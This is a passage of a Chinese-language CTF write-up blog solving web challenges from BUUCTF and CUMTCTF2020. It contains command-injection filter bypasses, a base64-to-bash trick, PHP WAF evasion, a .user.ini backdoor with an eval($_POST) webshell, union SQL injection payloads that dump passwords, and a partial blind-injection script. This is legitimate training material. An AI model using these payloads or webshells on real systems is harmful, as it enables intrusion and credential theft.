class=\"line\">![image-20200831164017570](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200831164017570.png)</span><br><span class=\"line\"></span><br><span class=\"line\">这时，我们发现flag也被过滤了，所以**黑名单绕过又有几种方式**</span><br><span class=\"line\"></span><br><span class=\"line\">1. 拼接</span><br></pre></td></tr></table></figure>\n<p>root@kali:~# a=c;b=at;c=fl;d=ag;$a$b $c$d<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">2. base64编码</span><br></pre></td></tr></table></figure>\n<p>root@kali:~# <code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d</code><br>this is your flag</p>\n<p>root@kali:~# echo “Y2F0IGZsYWc=”|base64 -d|bash<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">3. 单引号、双引号</span><br></pre></td></tr></table></figure>\n<p>root@kali:~# c””at fl’’ag<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">4. 反斜线</span><br></pre></td></tr></table></figure>\n<p>root@kali:~# c\\at fl\\ag<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">这里直接拼接过去就好</span><br></pre></td></tr></table></figure>\n<p>?ip=8.8.8.8;a=g;cat$IFS$1fla$a.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">即可拿到flag</span><br><span class=\"line\"></span><br><span class=\"line\">**主要是绕过空格和绕过黑名单**</span><br><span class=\"line\"></span><br><span class=\"line\">## [RoarCTF 2019]Easy Calc（php字符串解析）</span><br><span class=\"line\"></span><br><span class=\"line\">打开源码，发现calc.php ，然后访问calc.php</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20200901155413352](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200901155413352.png)</span><br><span class=\"line\"></span><br><span class=\"line\">num变量过滤了一些东西，但我们用一些函数去访问时，会发现403拒绝访问，说明有waf</span><br><span class=\"line\"></span><br><span class=\"line\">通过网上查找，是**php的字符串解析特性**</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; 1.删除空白符 </span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】</span><br><span class=\"line\"></span><br><span class=\"line\">先试一试phpinfo();可以用说明我们就成功了。</span><br><span class=\"line\"></span><br><span class=\"line\">接下来，就是读取目录，找flag了，从phpinfo中我们可以看见一些外部函数被ban了</span><br><span class=\"line\"></span><br><span class=\"line\">这时就需要介绍以下几个函数</span><br><span class=\"line\"></span><br><span class=\"line\">1. **scandir() 函数**:</span><br><span class=\"line\">   返回指定目录中的文件和目录的数组。</span><br><span class=\"line\"></span><br><span class=\"line\">2. **base_convert(number,formbase,tobase) 函数**:</span><br><span class=\"line\"></span><br><span class=\"line\">   在任意进制之间转换数字。</span><br><span class=\"line\"></span><br><span class=\"line\">3. **dechex() 函数**：</span><br><span class=\"line\"></span><br><span class=\"line\">   把十进制转换为十六进制。</span><br><span class=\"line\"></span><br><span class=\"line\">4. **hex2bin() 函数**：</span><br><span class=\"line\"></span><br><span class=\"line\">   把十六进制值的字符串转换为 ASCII 字符。</span><br><span class=\"line\"></span><br><span class=\"line\">5. **readfile() 函数**:</span><br><span class=\"line\"></span><br><span class=\"line\">   输出一个文件。</span><br><span class=\"line\"></span><br><span class=\"line\">6. **chr()函数**</span><br><span class=\"line\"></span><br><span class=\"line\">   十进制返回ascii字符</span><br><span class=\"line\"></span><br><span class=\"line\">7. **ord()函数**</span><br><span class=\"line\"></span><br><span class=\"line\">   ascii字符转换为十进制</span><br><span class=\"line\"></span><br><span class=\"line\">8. **file_get_contents()**</span><br><span class=\"line\"></span><br><span class=\"line\">   把文件读入一个字符串中</span><br><span class=\"line\"></span><br><span class=\"line\">通常会用hex2bin(dechex(47))一起使用，这个表示&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">这里&#x2F;被过滤了</span><br><span class=\"line\"></span><br><span class=\"line\">所以payload可以为</span><br></pre></td></tr></table></figure>\n<p>? num=var_dump(scandir(chr(47)))<br>? num=var_dump(scandir(hex2bin(dechex(47))))</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">发现flag直接readfile读取即可</span><br></pre></td></tr></table></figure>\n<p>? num=var_dump(readfile(chr(47).f1agg))<br>? num=file_get_contents(chr(47).f1agg)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">还有其他的payload</span><br></pre></td></tr></table></figure>\n<p>? num=base_convert(55490343972,10,36)()</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## [ACTF2020 新生赛]Exec</span><br><span class=\"line\"></span><br><span class=\"line\">直接查就可以</span><br></pre></td></tr></table></figure>\n<p>8.8.8.8;ls /<br>8.8.8.8;cat /flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## [极客大挑战 2019]Http</span><br><span class=\"line\"></span><br><span class=\"line\">改请求包xff，ua，ref。</span><br></pre></td></tr></table></figure>\n<p>GET /Secret.php HTTP/1.1<br>Host: node3.buuoj.cn:28918<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 Syclover<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>referer: <a href=\"https://www.Sycsecret.com\" target=\"_blank\" rel=\"noopener\">https://www.Sycsecret.com</a><br>X-Forwarded-for: 127.0.0.1</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"># 文件上传</span><br><span class=\"line\"></span><br><span class=\"line\">## [SUCTF 2019]CheckIn（.user.ini）</span><br><span class=\"line\"></span><br><span class=\"line\">&#96;&#96;&#96;php</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class=\"line\">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;Upload Labs&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;h2&gt;Upload Labs&lt;&#x2F;h2&gt;</span><br><span class=\"line\">    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class=\"line\">        &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;</span><br><span class=\"line\">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;fileUpload&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class=\"line\">        &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;upload&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class=\"line\">    &lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F; error_reporting(0);</span><br><span class=\"line\">$userdir &#x3D; &quot;uploads&#x2F;&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); &#x2F;&#x2F;这个是初始目录</span><br><span class=\"line\">if (!file_exists($userdir)) &#123;</span><br><span class=\"line\">    mkdir($userdir, 0777, true); &#x2F;&#x2F;如果不存在，就将创建目录可写可执行</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">file_put_contents($userdir . &quot;&#x2F;index.php&quot;, &quot;&quot;);</span><br><span class=\"line\">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class=\"line\">    $tmp_name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];</span><br><span class=\"line\">    $name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];</span><br><span class=\"line\">    if (!$tmp_name) &#123;  &#x2F;&#x2F;判断是否存在上传文件</span><br><span class=\"line\">        die(&quot;filesize too big!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (!$name) &#123;  &#x2F;&#x2F;文件名不许为空</span><br><span class=\"line\">        die(&quot;filename cannot be empty!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $extension &#x3D; substr($name, strrpos($name, &quot;.&quot;) + 1); &#x2F;&#x2F;截取后缀名</span><br><span class=\"line\">    if (preg_match(&quot;&#x2F;ph|htacess&#x2F;i&quot;, $extension)) &#123;</span><br><span class=\"line\">        die(&quot;illegal suffix!&quot;);  &#x2F;&#x2F;正则匹配，ph和htaccess都不可以</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !&#x3D;&#x3D; FALSE) &#123;</span><br><span class=\"line\">        die(&quot;&lt;? in contents!&quot;);  &#x2F;&#x2F;文件内容不许有&lt;?</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $image_type &#x3D; exif_imagetype($tmp_name);  &#x2F;&#x2F;判断一个图像的类型</span><br><span class=\"line\">    if (!$image_type) &#123;</span><br><span class=\"line\">        die(&quot;exif_imagetype:not image!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $upload_file_path &#x3D; $userdir . &quot;&#x2F;&quot; . $name;</span><br><span class=\"line\">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class=\"line\">    echo &quot;Your dir &quot; . $userdir. &#39; &lt;br&gt;&#39;;</span><br><span class=\"line\">    echo &#39;Your files : &lt;br&gt;&#39;;</span><br><span class=\"line\">    var_dump(scandir($userdir));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>源码如上，可以学习一下</p>\n<p><strong>其中exif_imagetype()可以记录一下</strong></p>\n<blockquote>\n<p>但我们可以通过给上传脚本加上相应的幻数头字节就可以绕过：</p>\n<ul>\n<li>JPG ：FF D8 FF E0 00 10 4A 46 49 46</li>\n<li>GIF(相当于文本的GIF89a)：47 49 46 38 39 61</li>\n<li>PNG： 89 50 4E 47</li>\n</ul>\n</blockquote>\n<p>这里想要上传成功，要借助一下.user.ini</p>\n<blockquote>\n<p><a href=\"https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html\" target=\"_blank\" rel=\"noopener\">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>\n<p>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>\n<p>其中有两个配置，可以用来制造后门：<br>auto_append_file、auto_prepend_file<br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;auto_prepend_file&#x3D;test.jpg</span><br></pre></td></tr></table></figure>\n<p>那么当我们访问此目录下的任何一个文件时，都会去包含test.jpg</p>\n<p>常见姿势：</p>\n<p>比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 </p>\n</blockquote>\n<p>这里最后就要写一个图片马了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n<p>然后把两个上传，连菜刀就可以拿到flag了</p>\n<p><strong>主要来学习一下文件上传的操作</strong></p>\n<h2 id=\"极客大挑战-2019-Upload\"><a href=\"#极客大挑战-2019-Upload\" class=\"headerlink\" title=\"[极客大挑战 2019]Upload\"></a>[极客大挑战 2019]Upload</h2><p>这个直接上传就可以，改一下文件内容的头，然后改下文件名phtml</p>\n<p>菜刀连接拿flag</p>\n<h2 id=\"ACTF2020-新生赛-BackupFile\"><a href=\"#ACTF2020-新生赛-BackupFile\" class=\"headerlink\" title=\"[ACTF2020 新生赛]BackupFile\"></a>[ACTF2020 新生赛]BackupFile</h2><p>备份文件index.php.bak</p>\n<p>两个等号弱等于，直接123拿flag</p>\n<h2 id=\"ACTF2020-新生赛-Upload\"><a href=\"#ACTF2020-新生赛-Upload\" class=\"headerlink\" title=\"[ACTF2020 新生赛]Upload\"></a>[ACTF2020 新生赛]Upload</h2><p>上传改名字，拿flag</p>\n<h2 id=\"极客大挑战-2019-Knife\"><a href=\"#极客大挑战-2019-Knife\" class=\"headerlink\" title=\"[极客大挑战 2019]Knife\"></a>[极客大挑战 2019]Knife</h2><p>直接菜刀连接，根目录下有flag</p>\n","categories":["BUU"],"tags":["web"]},{"title":"CUMTCTF2020","url":"https://pz1o.top/2020/09/25/CUMTCTF2020/","content":"<a id=\"more\"></a>\n<h1 id=\"CUMTCTF2020\"><a href=\"#CUMTCTF2020\" class=\"headerlink\" title=\"CUMTCTF2020\"></a>CUMTCTF2020</h1><p>第一次打比赛，大三的师傅们好强</p>\n<h1 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h1><h2 id=\"Web签到\"><a href=\"#Web签到\" class=\"headerlink\" title=\"Web签到\"></a>Web签到</h2><p><img src=\"/2020/09/25/CUMTCTF2020/image-20200925183359837.png\" alt=\"image-20200925183359837\"></p>\n<p>get传入参数1，post传入参数2，然后文件包含flag.php，查看源码拿flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#CUMTCTF&#123;179055b4-e8f5-42d2-bfe4-027d15e946b2&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Babysqli\"><a href=\"#Babysqli\" class=\"headerlink\" title=\"Babysqli\"></a>Babysqli</h2><p>过滤空格的sql注入，可以用/**/绕过,用union注入</p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#查表</span><br><span class=\"line\">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),5,6,7,8#</span><br><span class=\"line\">#emails,users</span><br><span class=\"line\">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;emails&#39;),5,6,7,8#</span><br><span class=\"line\">#id,email_id</span><br><span class=\"line\">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;users&#39;),5,6,7,8#</span><br><span class=\"line\">#user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br><span class=\"line\">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;users),5,6,7,8#</span><br><span class=\"line\">#CUMTCTF&#123;27ec8034-c9fe-0cfd-d92a-84362ecf0e42&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Secret\"><a href=\"#Secret\" class=\"headerlink\" title=\"Secret\"></a>Secret</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">view-source:http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;secret.jpg</span><br></pre></td></tr></table></figure>\n<p>直接看图片的源代码，发现后面有php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include_once</span>(<span class=\"string\">'flag.php'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'param1'</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $str1=$_GET[<span class=\"string\">'param1'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(file_get_contents($str1)!==<span class=\"string\">'Suvin_wants_a_girlfriend'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"Suvin doesn't like you\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'param2'</span>]))&#123;</span><br><span class=\"line\">        $str2=$_GET[<span class=\"string\">'param2'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!is_numeric($str2))</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'Suvin prefers strings of Numbers'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>($str2&lt;<span class=\"number\">3600</span>*<span class=\"number\">24</span>*<span class=\"number\">30</span>)</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'Suvin says the num is too short'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>($str2&gt;<span class=\"number\">3600</span>*<span class=\"number\">24</span>*<span class=\"number\">31</span>)</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'Suvin says the num is too long'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"Suvin says he's falling in love with you!\"</span>.<span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\">            sleep(intval($str2)); </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'param1'</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'param2'</span>])) &#123;</span><br><span class=\"line\">            $str1=$_POST[<span class=\"string\">'param1'</span>];</span><br><span class=\"line\">            $str2=$_POST[<span class=\"string\">'param2'</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(strlen($str1)&gt;<span class=\"number\">1000</span>)</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">\"It's too long\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">            <span class=\"keyword\">else</span> </span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">\"It's so similar to md5\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先get传入param1要和一个字符串相等可以用data://</p>\n<p>get传入param2要判断这个参数是否是数字并且要限制了范围，在加上有sleep，很自然的就想到了科学计数法</p>\n<p>因此payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;index.php?param2&#x3D;0.26e07&amp;param1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Suvin_wants_a_girlfriend</span><br></pre></td></tr></table></figure>\n<p>接下来是post的两个参数要的是字符串下的参数1和参数2不强等，但sha1加密强等，这里就不能用zhe数组绕过了</p>\n<p>这里找两个sha1加密的不一样的字符串,找的是那个pdf，然后提取前面的内容即可，最后抓包改参数1和参数2拿flag</p>\n<p><img src=\"/2020/09/25/CUMTCTF2020/image-20200925185006355.png\" alt=\"image-20200925185006355\"></p>\n<h2 id=\"Babysqli2\"><a href=\"#Babysqli2\" class=\"headerlink\" title=\"Babysqli2\"></a>Babysqli2</h2><p>过滤了<strong>单引号和字符串截断函数substr()和mid()</strong>并且无回显，因为有正确和错误登录界面那应该就是盲注了</p>\n<p>这里用left来截取字符串，并且用十六进制来替换单引号及其里面的内容</p>\n<p>直接放脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"comment\">#dict = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.-&#123;&#125;,'</span></span><br><span class=\"line\">dict=<span class=\"string\">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class=\"line\">url = <span class=\"string\">'http://202.119.201.197:13004/index.php'</span></span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\">j = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">400</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> 